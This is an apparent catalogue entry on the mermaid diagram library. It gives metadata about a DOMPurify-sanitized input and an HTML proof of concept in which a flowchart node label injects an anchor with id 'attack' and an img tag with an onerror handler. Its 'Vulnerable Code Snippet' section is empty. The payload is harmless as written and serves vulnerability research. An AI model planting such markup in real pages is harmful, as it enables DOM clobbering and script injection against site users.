## mermaid

### Meta

+ Library: mermaid
+ Version: v0.1.4
+ Stars: 70.6K
+ Fingerprint: `document.getElementsByClassName('mermaid').length > 0`
+ Input: Input
+ Sanitizer: DOMPurify
+ Capability: Any named property without collision
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/mermaid-js/mermaid

### Vulnerable Code Snippet

### PoC 

```html
<!--Library-->
<script type="module">
  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
</script>
<!--Library-->


<!--Payload-->
<pre class="mermaid">
  flowchart TD
      A[<a id=attack>hello</a><img src=a onerror=2+2 >] -->|Get money| B(Go shopping)
      B --> C{u}
</pre>
<!--Payload-->
```